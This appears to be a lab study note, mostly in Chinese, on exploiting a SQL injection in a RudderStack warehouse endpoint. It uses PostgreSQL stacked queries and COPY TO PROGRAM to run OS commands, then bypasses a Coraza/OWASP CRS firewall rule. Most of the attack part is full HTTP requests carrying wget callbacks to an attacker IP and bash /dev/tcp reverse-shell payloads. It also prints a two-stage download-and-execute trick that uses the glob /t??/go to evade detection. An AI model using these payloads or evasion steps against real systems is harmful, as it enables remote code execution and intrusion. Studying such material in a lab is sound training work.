### Exploiting the SQL Injection Vulnerability
測試上述路徑與 SQL 未過濾的特性：
傳送到 `/v1/warehouse/pending-events` 的 source_id 值，並將其寫入 SQL 語句 (`source_id:"'"`)\
![image](https://hackmd.io/_uploads/r1X8XfO1Gx.png)
> `pq: unterminated quoted string at or near "''';"`
> 1. quote 可逃脫
> 2. payload 真的進 SQL
> 3. backend 沒 parameterized query
> 4. DB engine 是 PostgreSQL

>[!Tip]
> PostgreSQL 與其他 SQL 的 schema 不相同
> - MySQL:
> ```sql
> INTO OUTFILE
> UDF
> ```
> - MSSQL：
> ```sql
> xp_cmdshell
> OLE automation
> ```
> - PostgreSQL：
> ```sql
> COPY TO PROGRAM
> large object
> extensions
> ```

PostgreSQL 支援 stacked query
```sql
1; select 2 FROM wh_uploads; -- -
```
![image](https://hackmd.io/_uploads/Hyn-eE_1Ml.png)
> 由於回應中沒有 error 推斷資料庫已執行了第二個 query

下一步尋找 PostgreSQL 有哪些 dangerous capability？
- COPY command: 若 DB user 擁有 `pg_read_server_files` 或`pg_write_server_files` roles，則可以利用指令將資料複製到本機檔案或從本機檔案複製資料\
若 DB user 擁有 `pg_execute_server_program` role，COPY 指令也可以將資料複製到 program 或 command\
PostgreSQL 支援 `COPY ... TO PROGRAM` 代表 DB Server 可執行 OS command

>[!Tip]
>在黑盒測試中，需要透過反覆試驗來確定資料庫使用者擁有哪些權限\
>詳細的 errr message 也可能揭示注入 payload 是否因權限不足而失敗

COPY 函數呼叫 wget 向 Kali 發送請求\
(Kali)\
![image](https://hackmd.io/_uploads/Bka56ruJfg.png)\
![image](https://hackmd.io/_uploads/rypjardkGl.png)
```
┌──(chw💲CHW)-[~]
└─$ python3 -m http.server 9000
[2026-05-18 04:27:51] python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
192.168.120.144 - - [29/Feb/2024 15:26:01] code 404, message File not found
192.168.120.144 - - [29/Feb/2024 15:26:01] "GET /it_worked HTTP/1.1" 404 -
```
Reverse shell:
```http
POST /v1/warehouse/pending-events?tiggerUpload=true HTTP/1.1
Host: rudderstack:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/json
Content-Length: 127

{

  "source_id":"'; COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/192.168.45.165/8888 0>&1\"'; -- -",
  "task_run_id":"1"

}
```
![image](https://hackmd.io/_uploads/HkqmPId1Ge.png)

## Bypassing a Web Application Firewall
WAF Evasion: WAF ≠ Security Boundary
- WAF 是 parser
- Backend 也是 parser

兩邊 interpretation 不一致，就能 WAF Bypass
### What is a WAF?
WAF 類似 [network firewalls](https://www.cisco.com/c/en/us/products/security/firewalls/what-is-a-firewall.html)，但專門為 Web application 和 HTTP(S) traffic 設計的
- WAF 運行在 OSI model 的  application layer (7) 
- 普通防火牆通常運行在  network layer (3) 


WAF 不只看 request 也可能看 response: `credit card`, `password`, `secret`\
或加 CSP、security header 等等

![image](https://hackmd.io/_uploads/ryhgqUuyfg.png)

### Getting Started with Coraza WAF
範例環境使用 container 運行 [Caddy](https://caddyserver.com/)，其中安裝了 OWASP [Coraza module](https://github.com/corazawaf/coraza-caddy)\
實際分析 WAF，Coraza 是 Open-source WAF Engine 使用 [ModSecurity Core Rule Set (CRS)](https://coreruleset.org/)

使用`docker logs`+ container name ，查看 Caddy 和 Coraza 的 log files，使用`-n` 指定 log 行數
```
docker logs -n 5 student_caddy_1
```
![image](https://hackmd.io/_uploads/BJEXeDuJMg.png)

### Triggering the WAF
利用先前的 SQLi payload 再次送出新的環境範例
```
{ "source_id":"'; copy (select 'a') to program 'wget -q http://192.168.45.165:9000/it_worked' -- - ", "task_run_id":"1"}
```
![image](https://hackmd.io/_uploads/BJzRSPuyGg.png)
> 顯示 403 資訊有限 (也驗證 WAF 阻擋)

使用 `'` 測試：\
![image](https://hackmd.io/_uploads/SkAovvO1Ge.png)
> 500 SQL error\
> 也代表 WAF 並不是看到單引號就擋
>> Signature-based Detection

查看 log:
```
student@rudder:~$ docker logs -n 5 student_caddy_1
{"level":"debug","ts":1709242735.4946961,"logger":"http.handlers.reverse_proxy","msg":"selected upstream","dial":"backend:8080","total_upstreams":1}
{"level":"debug","ts":1709242735.4958072,"logger":"http.handlers.reverse_proxy","msg":"upstream roundtrip","upstream":"backend:8080","duration":0.001060348,"request":{"remote_ip":"192.168.48.2","remote_port":"61683","client_ip":"192.168.48.2","proto":"HTTP/1.1","method":"POST","host":"rudderstack:80","uri":"/v1/warehouse/pending-events?triggerUpload=true","headers":{"Content-Length":["42"],"Accept-Encoding":["gzip, deflate, br"],"X-Forwarded-For":["192.168.48.2"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36"],"Accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],"X-Forwarded-Proto":["http"],"Upgrade-Insecure-Requests":["1"],"Content-Type":["application/json"],"Accept-Language":["en-US,en;q=0.9"],"X-Forwarded-Host":["rudderstack:80"]}},"headers":{"Vary":["Origin"],"X-Content-Type-Options":["nosniff"],"Content-Length":["227"],"Content-Type":["text/plain; charset=utf-8"],"Date":["Thu, 29 Feb 2024 21:38:55 GMT"]},"status":500}
{"level":"error","ts":1709242946.2066061,"logger":"http.handlers.waf","msg":"[client \"192.168.48.2\"] Coraza: Warning. SQL Authentication bypass (split query) [file \"/ruleset/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf\"] [line \"9227\"] [id \"942540\"] [rev \"\"] [msg \"SQL Authentication bypass (split query)\"] [data \"Matched Data: '; found within ARGS:json.source_id: ';\"] [severity \"critical\"] [ver \"OWASP_CRS/4.0.1-dev\"] 
```
> `Coraza: Warning. SQL Authentication bypass (split query) [file \"/ruleset/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf\"] [line \"9227\"] [id \"942540\"] `\
> 942540 就是 CRS Rule ID\
> 能夠得知因為`';` 被擋

### Analyzing the WAF Ruleset
Reverse Engineering WAF Rule\
在 `/home/student/caddy/ruleset/rules/` 找到 REQUEST-942-APPLICATION-ATTACK-SQLI.conf 

要在 code-server 上查看該文件， 可以訪問 ` http://rudderstack:8000/?folder=/home/student/caddy`
開啟目錄，搜尋 "SQL Authentication bypass (split query)" \
L547 行:
```conf
# This rule catches an authentication bypass via SQL injection that abuses semi-colons to end the SQL query early.
# Any characters after the semi-colon are ignored by some DBMSes (e.g. SQLite).
#
# An example of this would be:
#   email=admin%40juice-sh.op';&password=foo
#
# The server then turns this into:
#   SELECT * FROM users WHERE email='admin@juice-sh.op';' AND password='foo'
#
# Regular expression generated from regex-assembly/942540.ra.
# To update the regular expression run the following shell script
# (consult https://coreruleset.org/docs/development/regex_assembly/ for details):
#   crs-toolchain regex update 942540
#
SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "@rx ^(?:[^']*'|[^\"]*\"|[^`]*`)[\s\v]*;" \
    "id:942540,\
    phase:2,\
    block,\
    capture,\
    t:none,t:urlDecodeUni,t:replaceComments,\
    msg:'SQL Authentication bypass (split query)',\
    logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'platform-multi',\
    tag:'attack-sqli',\
    tag:'OWASP_CRS',\
    tag:'capec/1000/152/248/66',\
    tag:'PCI/6.5.2',\
    tag:'paranoia-level/1',\
    ver:'OWASP_CRS/4.0.0-rc2',\
    severity:'CRITICAL',\
    setvar:'tx.sql_injection_score=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
```
> ModSecurity / CRS Rule Syntax

- Rule Structure
```
inspect target
↓
apply operator
↓
if matched
↓
take action
```
![image](https://hackmd.io/_uploads/SJOubtdkfl.png)

- Inspect Target: `REQUEST_COOKIES`, `ARGS`, `ARGS_NAMES`, `XML`
代表 WAF 會檢查 Cookie, Parameter, JSON body, XML

- Operator: `@rx` regex
Regex: (以 [SecRule](https://www.coraza.io/docs/seclang/directives/#secrule) 開頭)
```
^(?:[^']*'|[^\"]*\"|[^`]*`)[\s\v]*;
```
> quote + semicolon\
> 這條 rule 實際上在擋 stacked query injection
> 在 `t:none,t:urlDecodeUni,t:replaceComments,` 表示 URL decode 後再比對，且會移除 comments

### Bypassing the WAF
在嘗試 Bypass 前可以利用 [regex101](https://regex101.com/) 測試正規表達式\
![image](https://hackmd.io/_uploads/HJuX7YdyGg.png)

```
{ "source_id":"' or 1=2; copy (select 'a') to program 'wget -q http://192.168.45.189:9000/it_will_bypass' -- - ", "task_run_id":"1"}
```
![image](https://hackmd.io/_uploads/rypB4F_kzl.png)
> 成功繞過 WAF

#### - Reverse shell:
1. 下載 /go 到 /tmp/go
```http
POST /v1/warehouse/pending-events?triggerUpload=true HTTP/1.1
Host: rudderstack
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-
exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/json
Content-Length: 122

{
    "source_id":"' or 1=2; copy (select 'a') to program 'wget -q -P/tmp http://192.168.45.189:9000/go' -- -",
    "task_run_id":"1"
 }
```
 2. 執行 /tmp/go
```http
POST /v1/warehouse/pending-events?triggerUpload=true HTTP/1.1
Host: rudderstack
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/json
Content-Length: 95

{
    "source_id":"' or 1=2; copy (select 'a') to program 'sh /t??/go' -- -",
    "task_run_id":"1"
}
```
go 檔案內容是：
```go
#!/bin/sh
bash -c 'bash -i >& /dev/tcp/192.168.45.189/8888 0>&1'
```
為什麼可以繞過：\
CRS rule 主要抓這種 pattern：引號後面接空白再接分號
```
^(?:[^']*'|[^\"]*\"|[^`]*`)[\s\v]*;
```
原本這種比較容易被擋：
```
 ' or 1=2; copy ... to program 'wget ... -O /tmp/rs.sh' -- -
```
但實際繞過的關鍵不是完全避開第一個 SQL 分號，因為已確認 `wget http://.../it_will_bypass` 本來就能過\
真正被擋的是後面 command 裡的高風險特徵，例如：
```
-O /tmp/rs.sh
; sh /tmp/rs.sh
/dev/tcp
|
/tmp/...
```
所以拆成兩段：
1. 下載階段只用單純 wget -q -P/tmp http://.../go
      - 不用 -O /tmp/xxx
      - 不在同一個 command 裡接 ; sh ...
      - 目標端會把檔案存成 /tmp/go
2. 執行階段用 sh /t??/go
      - shell 會把 /t??/go 展開成 /tmp/go
      - request body 裡不直接出現 /tmp
      - command 很短，沒有 pipe、redirection、/dev/tcp 等明顯特徵

  真正的 reverse shell 字串藏在下載下來的 go 檔案裡，不出現在被 WAF 檢查的 request body 因此成功繞過

# Conclusion
![image](https://hackmd.io/_uploads/BJTwGcukMg.png)

FROM Learning Module :
"Do not give up, and always remember to Try Harder."

![image](https://hackmd.io/_uploads/SkwIX5d1fx.png)
